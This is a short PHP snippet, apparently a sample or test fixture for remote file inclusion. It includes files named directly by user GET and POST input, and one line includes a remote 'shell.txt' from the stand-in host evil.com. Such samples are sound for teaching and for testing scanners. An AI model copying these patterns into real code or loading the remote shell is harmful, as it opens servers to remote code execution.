<?php
// Remote file inclusion
include $_GET['page'];
require($_POST['file']);
include_once("http://evil.com/shell.txt");
?>
